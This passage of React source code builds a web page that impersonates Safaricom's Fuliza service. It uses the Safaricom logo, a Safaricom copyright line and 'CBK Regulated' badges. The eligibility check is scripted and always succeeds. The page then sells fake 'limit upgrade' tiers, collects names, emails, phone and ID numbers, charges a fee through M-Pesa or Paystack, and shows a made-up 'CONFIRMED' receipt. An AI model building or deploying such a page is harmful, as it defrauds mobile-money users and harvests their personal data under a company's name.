      )}

      <button 
        type="submit" 
        disabled={!isValid || securityState.isValidating} 
        className="w-full py-4 rounded-2xl gradient-safaricom text-white font-bold text-base flex items-center justify-center gap-2 disabled:opacity-40 disabled:cursor-not-allowed hover:shadow-xl hover:shadow-safaricom-500/30 transition-all"
      >
        {securityState.isValidating ? (
          <>
            <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
            Verifying securely...
          </>
        ) : (
          <>
            <Icon.Lock className="w-4 h-4" /> Verify eligibility securely
          </>
        )}
      </button>

      <div className="flex items-center justify-center gap-3 text-[10px] text-slate-400 uppercase tracking-wider">
        <span className="flex items-center gap-1"><Icon.Shield className="w-3 h-3" /> SSL</span>
        <span>·</span>
        <span>PCI-DSS</span>
        <span>·</span>
        <span>CBK Regulated</span>
      </div>
    </form>
  );
}

function LoadingStep({ setStep }: { setStep: (s: Step) => void }) {
  const messages = [
    'Verifying your M-Pesa account...',
    'Checking Safaricom eligibility...',
    'Calculating your Fuliza limit...',
    'Preparing upgrade options...',
  ];
  const [i, setI] = useState(0);
  useEffect(() => {
    const t = setInterval(() => setI(prev => (prev + 1) % messages.length), 800);
    const finish = setTimeout(() => setStep('tiers'), 3200);
    return () => { clearInterval(t); clearTimeout(finish); };
  }, []);
  return (
    <div className="py-10 text-center">
      <div className="relative w-20 h-20 mx-auto mb-5">
        <div className="absolute inset-0 rounded-full border-4 border-safaricom-100"></div>
        <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-safaricom-500 spin-slow"></div>
        <div className="absolute inset-3 rounded-full gradient-safaricom flex items-center justify-center">
          <Icon.ShieldCheck className="w-6 h-6 text-white" />
        </div>
      </div>
      <h3 className="text-lg font-extrabold text-slate-900">{messages[i]}</h3>
      <p className="text-sm text-slate-500 mt-1.5">This usually takes less than 5 seconds.</p>
      <div className="mt-6 max-w-xs mx-auto space-y-1.5">
        {messages.map((m, idx) => (
          <div key={idx} className={`flex items-center gap-2 text-xs ${idx < i ? 'text-safaricom-600' : idx === i ? 'text-slate-700 font-semibold' : 'text-slate-400'}`}>
            {idx < i ? <Icon.CheckCircle className="w-3.5 h-3.5" /> : idx === i ? <Icon.Loader className="w-3.5 h-3.5 spin-slow" /> : <div className="w-3.5 h-3.5 rounded-full border-2 border-slate-200" />}
            {m.replace('...', '')}
          </div>
        ))}
      </div>
    </div>
  );
}

function TiersStep({ form, setForm, setStep, limitResult }: { form: FormData; setForm: (f: FormData) => void; setStep: (s: Step) => void; limitResult: { max: number } | null }) {
  return (
    <div className="space-y-5">
      <div className="rounded-2xl bg-gradient-to-br from-safaricom-700 to-safaricom-900 p-5 sm:p-6 text-white relative overflow-hidden">
        <div className="absolute -right-8 -top-8 w-32 h-32 rounded-full bg-safaricom-400/20 blur-2xl"></div>
        <div className="relative">
          <div className="text-[10px] font-bold tracking-widest text-safaricom-200 mb-1">FULIZA ELIGIBILITY</div>
          <div className="flex items-baseline gap-2 flex-wrap">
            <div className="text-4xl sm:text-5xl font-extrabold">Eligible</div>
            <div className="text-sm text-safaricom-200">for upgrade</div>
          </div>
          <div className="mt-3 flex items-center gap-2 text-xs text-safaricom-100">
            <Icon.CheckCircle className="w-4 h-4 text-safaricom-300" />
            <span>Your account qualifies for Fuliza limit upgrade · Choose your preferred tier below</span>
          </div>
        </div>
      </div>

      <div>
        <h2 className="text-lg font-extrabold text-slate-900 mb-1">Choose your upgrade tier</h2>
        <p className="text-sm text-slate-500">Select your desired Fuliza limit. The fee is a one-time charge paid via M-Pesa or card.</p>
      </div>

      <div className="grid sm:grid-cols-2 gap-3">
        {tiers.map((t, i) => (
          <button
            key={i}
            onClick={() => setForm({ ...form, selectedTier: i })}
            className={`relative text-left p-4 sm:p-5 rounded-2xl border-2 transition-all ${
              form.selectedTier === i
                ? 'border-safaricom-500 bg-safaricom-50/50 ring-4 ring-safaricom-500/10'
                : 'border-slate-200 hover:border-safaricom-300 bg-white'
            }`}
          >
            {t.popular && (
              <div className="absolute -top-2.5 right-3 px-2.5 py-0.5 rounded-full gradient-fuliza text-white text-[10px] font-bold tracking-wider">MOST POPULAR</div>
            )}
            <div className="flex items-start justify-between gap-2">
              <div>
                <div className="text-[10px] font-bold tracking-widest text-slate-500 mb-1">{t.badge.toUpperCase()}</div>
                <div className="text-2xl font-extrabold text-slate-900">KES {t.amount.toLocaleString()}</div>
                <div className="text-xs text-slate-500 mt-0.5">+ KES {t.fee} one-time fee</div>
              </div>
              <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center shrink-0 transition-colors ${form.selectedTier === i ? 'border-safaricom-500 bg-safaricom-500' : 'border-slate-300'}`}>
                {form.selectedTier === i && <Icon.Check className="w-3.5 h-3.5 text-white" />}
              </div>
            </div>
            <div className="mt-3 flex items-center gap-3 text-xs text-slate-500">
              <span className="flex items-center gap-1"><Icon.Clock className="w-3 h-3" /> {t.duration}</span>
              <span className="flex items-center gap-1"><Icon.Zap className="w-3 h-3" /> Instant</span>
            </div>
          </button>
        ))}
      </div>

      <div className="p-3.5 rounded-2xl bg-amber-50 border border-amber-200 flex items-start gap-2.5">
        <Icon.Info className="w-4 h-4 text-amber-600 mt-0.5 shrink-0" />
        <p className="text-xs text-amber-900 leading-relaxed">
          <span className="font-bold">Illustrative tiers:</span> Actual Fuliza limits are set by Safaricom based on usage and eligibility. The fee is a one-time charge for the limit upgrade.
        </p>
      </div>

      <div className="flex items-center gap-3">
        <button onClick={() => setStep('phone')} className="px-5 py-3 rounded-2xl bg-slate-100 text-slate-900 font-bold flex items-center gap-1.5 hover:bg-slate-200 transition-colors">
          <Icon.ArrowLeft className="w-4 h-4" /> Back
        </button>
        <button onClick={() => setStep('details')} disabled={form.selectedTier === null} className="flex-1 py-3.5 rounded-2xl gradient-safaricom text-white font-bold flex items-center justify-center gap-2 disabled:opacity-40 disabled:cursor-not-allowed hover:shadow-xl hover:shadow-safaricom-500/30 transition-all">
          Continue with {form.selectedTier !== null ? `KES ${tiers[form.selectedTier].amount.toLocaleString()}` : 'selection'} <Icon.ArrowRight className="w-4 h-4" />
        </button>
      </div>
    </div>
  );
}

function DetailsStep({ form, setForm, setStep }: { form: FormData; setForm: (f: FormData) => void; setStep: (s: Step) => void }) {
  const selected = form.selectedTier !== null ? tiers[form.selectedTier] : null;
  const [honeypot, setHoneypot] = useState('');
  const [formStartTime] = useState(Date.now());
  const { secureFormSubmit, securityState } = useSecurity();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const formData = {
      fullName: form.fullName,
      email: form.email,
      county: form.county,
      phone: form.phone,
      idNumber: form.idNumber
    };

    const result = await secureFormSubmit(formData, formStartTime, honeypot);
    
    if (result.success) {
      auditLog.log('details_step_completed', {
        tier: form.selectedTier,
        amount: selected?.amount
      });
      setStep('pay');
    } else if (result.error) {
      alert(result.error);
    }
  };

  const isValid = !securityState.validationErrors.fullName && 
                  !securityState.validationErrors.email && 
                  !securityState.validationErrors.county &&
                  !securityState.isRateLimited;

  return (
    <form onSubmit={handleSubmit} className="space-y-5">
      <HoneypotField onChange={setHoneypot} />
      
      <div>
        <h2 className="text-lg sm:text-xl font-extrabold text-slate-900">Confirm your details</h2>
        <p className="text-sm text-slate-500 mt-1">One more step before secure payment. Your information is encrypted.</p>
      </div>

      <div className="p-4 rounded-2xl bg-gradient-to-br from-safaricom-50 to-white border border-safaricom-100">
        <div className="text-[10px] font-bold tracking-widest text-safaricom-700 mb-2">UPGRADE SUMMARY</div>
        <div className="flex items-center justify-between">
          <div>
            <div className="text-xl font-extrabold text-slate-900">KES {selected?.amount.toLocaleString()}</div>
            <div className="text-xs text-slate-500">Fuliza limit · {selected?.duration}</div>
          </div>
          <div className="text-right">
            <div className="text-lg font-bold text-fuliza-600">KES {selected?.fee}</div>
            <div className="text-xs text-slate-500">One-time fee</div>
          </div>
        </div>
      </div>

      <SecureInput
        type="text"
        value={form.fullName}
        onChange={(value) => setForm({ ...form, fullName: value })}
        label="Full name (as on M-Pesa)"
        placeholder="e.g. Wanjiru Mwangi"
        error={securityState.validationErrors.fullName}
        required
        maxLength={50}
      />

      <SecureInput
        type="email"
        value={form.email}
        onChange={(value) => setForm({ ...form, email: value })}
        label="Email address"
        placeholder="you@example.com"
        error={securityState.validationErrors.email}
        required
        maxLength={100}
      />

      <div>
        <label className="block text-sm font-semibold text-slate-700 mb-2">County</label>
        <select 
          value={form.county} 
          onChange={e => setForm({ ...form, county: e.target.value })} 
          className="w-full px-4 py-3 rounded-xl border-2 border-slate-200 focus:border-safaricom-500 outline-none transition-colors bg-white text-sm"
        >
          {counties.map(c => <option key={c}>{c}</option>)}
        </select>
        {securityState.validationErrors.county && (
          <div className="mt-2 flex items-center gap-1.5 text-sm text-red-600">
            <Icon.AlertTriangle className="w-4 h-4 shrink-0" />
            <span>{securityState.validationErrors.county}</span>
          </div>
        )}
      </div>

      {securityState.isRateLimited && (
        <div className="p-3 rounded-2xl bg-red-50 border border-red-200 flex items-center gap-2">
          <Icon.AlertTriangle className="w-4 h-4 text-red-600" />
          <span className="text-sm text-red-700">
            Too many attempts. Please try again in {Math.ceil((securityState.rateLimitReset - Date.now()) / 60000)} minutes.
          </span>
        </div>
      )}

      <div className="flex items-center gap-3">
        <button type="button" onClick={() => setStep('tiers')} className="px-5 py-3 rounded-2xl bg-slate-100 text-slate-900 font-bold flex items-center gap-1.5 hover:bg-slate-200 transition-colors">
          <Icon.ArrowLeft className="w-4 h-4" /> Back
        </button>
        <button 
          type="submit" 
          disabled={!isValid || securityState.isValidating} 
          className="flex-1 py-3.5 rounded-2xl gradient-safaricom text-white font-bold flex items-center justify-center gap-2 disabled:opacity-40 disabled:cursor-not-allowed hover:shadow-xl hover:shadow-safaricom-500/30 transition-all"
        >
          {securityState.isValidating ? (
            <>
              <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
              Validating...
            </>
          ) : (
            <>
              Continue to payment <Icon.ArrowRight className="w-4 h-4" />
            </>
          )}
        </button>
      </div>
    </form>
  );
}

function PayStep({ form, setStep }: { form: FormData; setStep: (s: Step) => void }) {
  const selected = form.selectedTier !== null ? tiers[form.selectedTier] : null;
  const [method, setMethod] = useState<'mpesa' | 'paystack' | 'card'>('mpesa');
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [paymentReference, setPaymentReference] = useState<string>('');
  const { generateReference } = usePayment();

  const handlePaymentInitiate = () => {
    const reference = generateReference();
    setPaymentReference(reference);
    setShowPaymentModal(true);
    
    auditLog.log('payment_modal_opened', {
      method,
      amount: selected?.fee,
      reference
    });
  };

  const handlePaymentSuccess = (reference: string) => {
    auditLog.log('payment_completed', {
      method,
      reference,
      amount: selected?.fee,
      tier: form.selectedTier
    });
    
    setShowPaymentModal(false);
    setStep('done');
  };

  const paymentData = selected ? {
    amount: selected.fee,
    currency: 'KES',
    email: form.email,
    phone: form.phone,
    fullName: form.fullName,
    reference: paymentReference,
    metadata: {
      tier: form.selectedTier || 0,
      tierAmount: selected.amount,
      upgradeType: `${selected.badge} Tier - KES ${selected.amount.toLocaleString()}`,
    }
  } : null;

  return (
    <>
      <form onSubmit={(e) => { e.preventDefault(); handlePaymentInitiate(); }} className="space-y-5">
        <div>
          <h2 className="text-lg sm:text-xl font-extrabold text-slate-900">Secure payment</h2>
          <p className="text-sm text-slate-500 mt-1">Choose your preferred payment method. All payments are secured with bank-grade encryption.</p>
        </div>

        <div className="p-5 rounded-2xl bg-slate-900 text-white relative overflow-hidden">
          <div className="absolute -top-6 -right-6 w-32 h-32 rounded-full bg-safaricom-400/20 blur-2xl"></div>
          <div className="relative">
            <div className="flex items-center justify-between mb-3">
              <div className="text-[10px] font-bold tracking-widest text-slate-400">ORDER SUMMARY</div>
              <Icon.Lock className="w-4 h-4 text-safaricom-300" />
            </div>
            <div className="flex items-center justify-between mb-2">
              <span className="text-sm text-slate-300">Fuliza upgrade tier</span>
              <span className="text-sm font-bold">KES {selected?.amount.toLocaleString()}</span>
            </div>
            <div className="flex items-center justify-between mb-2">
              <span className="text-sm text-slate-300">One-time upgrade fee</span>
              <span className="text-sm font-bold">KES {selected?.fee}</span>
            </div>
            <div className="my-3 border-t border-slate-700"></div>
            <div className="flex items-center justify-between">
              <span className="text-base font-bold">Total payable</span>
              <span className="text-2xl font-extrabold text-safaricom-300">KES {selected?.fee}</span>
            </div>
          </div>
        </div>

        <div>
          <label className="text-xs font-bold text-slate-700 mb-3 block">Choose payment method</label>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            {[
              { 
                id: 'mpesa', 
                name: 'M-Pesa STK Push', 
                desc: 'Pay directly from your M-Pesa wallet', 
                icon: Icon.Smartphone,
                color: 'from-emerald-500 to-green-600',
                features: ['Instant payment', 'No card required', 'M-Pesa PIN only', 'SMS confirmation']
              },
              { 
                id: 'paystack', 
                name: 'Paystack Gateway', 
                desc: 'Cards, Bank transfers & Mobile Money', 
                icon: Icon.CreditCard,
                color: 'from-blue-500 to-indigo-600',
                features: ['All major cards', 'Bank transfers', 'Mobile money', 'International cards']
              },
            ].map(m => (
              <button 
                key={m.id} 
                type="button" 
                onClick={() => setMethod(m.id as any)} 
                className={`relative p-5 rounded-2xl border-2 text-left transition-all ${
                  method === m.id 
                    ? 'border-safaricom-500 bg-safaricom-50/50 ring-4 ring-safaricom-500/10' 
                    : 'border-slate-200 hover:border-slate-300 bg-white hover:bg-slate-50'
                }`}
              >
                <div className="flex items-start gap-4">
                  <div className={`w-14 h-14 rounded-xl bg-gradient-to-br ${m.color} flex items-center justify-center shrink-0`}>
                    <m.icon className="w-7 h-7 text-white" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="font-bold text-slate-900 mb-1 text-base">{m.name}</div>
                    <div className="text-sm text-slate-600 mb-3">{m.desc}</div>
                    <div className="space-y-1.5">
                      {m.features.map((feature, i) => (
                        <div key={i} className="flex items-center gap-2 text-sm text-slate-500">
                          <Icon.Check className="w-4 h-4 text-safaricom-500" />
                          <span>{feature}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
                {method === m.id && (
                  <div className="absolute -top-2 -right-2 w-7 h-7 rounded-full gradient-safaricom text-white flex items-center justify-center">
                    <Icon.Check className="w-4 h-4" />
                  </div>
                )}
              </button>
            ))}
          </div>
        </div>

        {/* Payment Method Details */}
        {method === 'mpesa' && (
          <div className="p-4 rounded-2xl bg-emerald-50 border border-emerald-200">
            <div className="flex items-center gap-2 text-sm font-bold text-emerald-700 mb-2">
              <Icon.Smartphone className="w-4 h-4" /> M-PESA STK PUSH
            </div>
            <p className="text-sm text-emerald-800 mb-2">
              A payment prompt will be sent to <span className="font-bold">+254 {form.phone}</span>
            </p>
            <div className="text-xs text-emerald-700 space-y-1">
              <div className="flex items-center gap-1.5">
                <Icon.Check className="w-3 h-3" />
                <span>Enter your M-Pesa PIN when prompted</span>
              </div>
              <div className="flex items-center gap-1.5">
                <Icon.Check className="w-3 h-3" />
                <span>Payment is processed instantly</span>
              </div>
              <div className="flex items-center gap-1.5">
                <Icon.Check className="w-3 h-3" />
                <span>You'll receive an SMS confirmation</span>
              </div>
            </div>
          </div>
        )}

        {method === 'paystack' && (
          <div className="p-4 rounded-2xl bg-blue-50 border border-blue-200">
            <div className="flex items-center gap-2 text-sm font-bold text-blue-700 mb-2">
              <Icon.CreditCard className="w-4 h-4" /> PAYSTACK GATEWAY
            </div>
            <p className="text-sm text-blue-800 mb-2">
              Secure payment gateway supporting multiple payment methods
            </p>
            <div className="text-xs text-blue-700 space-y-1">
              <div className="flex items-center gap-1.5">
                <Icon.Check className="w-3 h-3" />
                <span>Visa, Mastercard, Verve cards accepted</span>
              </div>
              <div className="flex items-center gap-1.5">
                <Icon.Check className="w-3 h-3" />
                <span>Bank transfers and USSD payments</span>
              </div>
              <div className="flex items-center gap-1.5">
                <Icon.Check className="w-3 h-3" />
                <span>Mobile money and QR payments</span>
              </div>
              <div className="flex items-center gap-1.5">
                <Icon.Check className="w-3 h-3" />
                <span>PCI-DSS compliant and secure</span>
              </div>
            </div>
          </div>
        )}

        <div className="flex items-center gap-3">
          <button type="button" onClick={() => setStep('details')} className="px-5 py-3 rounded-2xl bg-slate-100 text-slate-900 font-bold flex items-center gap-1.5 hover:bg-slate-200 transition-colors">
            <Icon.ArrowLeft className="w-4 h-4" /> Back
          </button>
          <button type="submit" className="flex-1 py-3.5 rounded-2xl gradient-safaricom text-white font-bold flex items-center justify-center gap-2 hover:shadow-xl hover:shadow-safaricom-500/30 transition-all">
            <Icon.Lock className="w-4 h-4" /> 
            Continue to {method === 'mpesa' ? 'M-Pesa' : method === 'paystack' ? 'Paystack' : 'Card Payment'}
          </button>
        </div>

        <div className="flex items-center justify-center gap-3 text-[10px] text-slate-500">
          <span className="flex items-center gap-1"><Icon.Shield className="w-3 h-3" /> SSL Secured</span>
          <span>•</span>
          <span>PCI-DSS Compliant</span>
          <span>•</span>
          <span>Bank-Grade Encryption</span>
        </div>
      </form>

      {/* Payment Modal */}
      {showPaymentModal && paymentData && (
        <PaymentModal
          isOpen={showPaymentModal}
          onClose={() => setShowPaymentModal(false)}
          onSuccess={handlePaymentSuccess}
          paymentData={paymentData}
          selectedMethod={method}
        />
      )}
    </>
  );
}

function DoneStep({ form, onHome }: { form: FormData; onHome: () => void }) {
  const selected = form.selectedTier !== null ? tiers[form.selectedTier] : null;
  const ref = 'FUL-' + Math.random().toString(36).slice(2, 8).toUpperCase();
  return (
    <div className="text-center py-6 fade-up">
      <div className="w-20 h-20 mx-auto rounded-full gradient-safaricom flex items-center justify-center mb-4 shadow-2xl shadow-safaricom-500/30">
        <Icon.Check className="w-10 h-10 text-white" />
      </div>
      <h2 className="text-2xl sm:text-3xl font-extrabold text-slate-900">Payment successful! 🎉</h2>
      <p className="text-sm text-slate-500 mt-2">Your Fuliza upgrade request is being processed.</p>

      <div className="mt-6 max-w-md mx-auto p-5 rounded-2xl bg-gradient-to-br from-safaricom-50 to-white border border-safaricom-100 text-left space-y-3">
        <div className="flex items-center justify-between">
          <span className="text-xs text-slate-500">Reference</span>
          <span className="text-sm font-bold text-slate-900 font-mono">{ref}</span>
        </div>
        <div className="flex items-center justify-between">
          <span className="text-xs text-slate-500">New Fuliza limit</span>
          <span className="text-base font-extrabold text-safaricom-700">KES {selected?.amount.toLocaleString()}</span>
        </div>
        <div className="flex items-center justify-between">
          <span className="text-xs text-slate-500">Amount paid</span>
          <span className="text-sm font-bold text-slate-900">KES {(selected?.amount || 0) + (selected?.fee || 0)}</span>
        </div>
        <div className="flex items-center justify-between">
          <span className="text-xs text-slate-500">Status</span>
          <span className="px-2 py-0.5 rounded-md bg-emerald-100 text-emerald-700 text-[10px] font-bold">CONFIRMED</span>
        </div>
      </div>

      <div className="mt-6 max-w-md mx-auto p-4 rounded-2xl bg-slate-50 border border-slate-200 text-left space-y-2.5">
        <div className="flex items-start gap-2.5">
          <Icon.Clock className="w-4 h-4 text-safaricom-600 mt-0.5 shrink-0" />
          <div>
            <div className="text-xs font-bold text-slate-900">Activation time</div>
            <div className="text-xs text-slate-500">Your new limit is active within 24 hours. You'll receive an M-Pesa SMS confirmation.</div>
          </div>
        </div>
        <div className="flex items-start gap-2.5">
          <Icon.Mail className="w-4 h-4 text-safaricom-600 mt-0.5 shrink-0" />
          <div>
            <div className="text-xs font-bold text-slate-900">Receipt sent</div>
            <div className="text-xs text-slate-500">A detailed receipt has been sent to {form.email || 'your email'}.</div>
          </div>
        </div>
        <div className="flex items-start gap-2.5">
          <Icon.Headphones className="w-4 h-4 text-safaricom-600 mt-0.5 shrink-0" />
          <div>
            <div className="text-xs font-bold text-slate-900">Need help?</div>
            <div className="text-xs text-slate-500">Call Safaricom customer care at 100 or 234 — free from your line, 24/7.</div>
          </div>
        </div>
      </div>

      <div className="mt-6 flex flex-col sm:flex-row gap-2 justify-center">
        <button onClick={onHome} className="px-6 py-3 rounded-full gradient-safaricom text-white font-bold flex items-center justify-center gap-2">
          <Icon.Home className="w-4 h-4" /> Back to home
        </button>
        <button className="px-6 py-3 rounded-full bg-slate-100 text-slate-900 font-bold flex items-center justify-center gap-2">
          <Icon.Mail className="w-4 h-4" /> Email receipt
        </button>
      </div>
    </div>
  );
}

function Footer({ onCheck }: { onCheck: () => void }) {
  return (
    <footer className="bg-safaricom-900 text-white">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 py-10 sm:py-14">
        <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8">
          <div>
            <div className="flex items-center gap-2 mb-3">
              <SafaricomLogo className="h-8" />
            </div>
            <p className="text-xs text-safaricom-200 leading-relaxed">A Fuliza limit-check portal.</p>
            <div className="mt-4 flex items-center gap-2">
              {[Icon.Facebook, Icon.Twitter, Icon.Instagram, Icon.Youtube].map((I, i) => (
                <a key={i} className="w-8 h-8 rounded-full bg-white/10 hover:bg-safaricom-500 flex items-center justify-center transition-colors">
                  <I className="w-4 h-4" />
                </a>
              ))}
            </div>
          </div>
          <div>
            <h4 className="font-bold text-sm mb-3">Quick links</h4>
            <ul className="space-y-2 text-xs text-safaricom-200">
              <li><a className="hover:text-white cursor-pointer">Fuliza FAQs</a></li>
              <li><a className="hover:text-white cursor-pointer">M-Pesa tariffs</a></li>
              <li><a className="hover:text-white cursor-pointer">Safaricom home</a></li>
              <li><a className="hover:text-white cursor-pointer">Customer care</a></li>
              <li><button onClick={onCheck} className="hover:text-white font-semibold">Check my limit →</button></li>
            </ul>
          </div>
          <div>
            <h4 className="font-bold text-sm mb-3">Support</h4>
            <ul className="space-y-2 text-xs text-safaricom-200">
              <li className="flex items-center gap-1.5"><Icon.Phone className="w-3.5 h-3.5" /> 100 / 234 (Safaricom)</li>
              <li className="flex items-center gap-1.5"><Icon.Mail className="w-3.5 h-3.5" /> fuliza@safaricom.co.ke</li>
              <li className="flex items-center gap-1.5"><Icon.Clock className="w-3.5 h-3.5" /> 24/7 support</li>
            </ul>
          </div>
          <div>
            <h4 className="font-bold text-sm mb-3">Legal</h4>
            <ul className="space-y-2 text-xs text-safaricom-200">
              <li><a className="hover:text-white cursor-pointer">Terms of service</a></li>
              <li><a className="hover:text-white cursor-pointer">Privacy policy</a></li>
              <li><a className="hover:text-white cursor-pointer">Cookie policy</a></li>
              <li><a className="hover:text-white cursor-pointer">CBK regulations</a></li>
            </ul>
          </div>
        </div>
        <div className="mt-10 pt-6 border-t border-safaricom-800 flex flex-col sm:flex-row items-center justify-between gap-3 text-[10px] text-safaricom-300">
          <p>© 2026 Safaricom PLC · Twaweza · All rights reserved</p>
          <p>Powered by Paystack · Secured by Safaricom</p>
        </div>
      </div>
    </footer>
  );
}
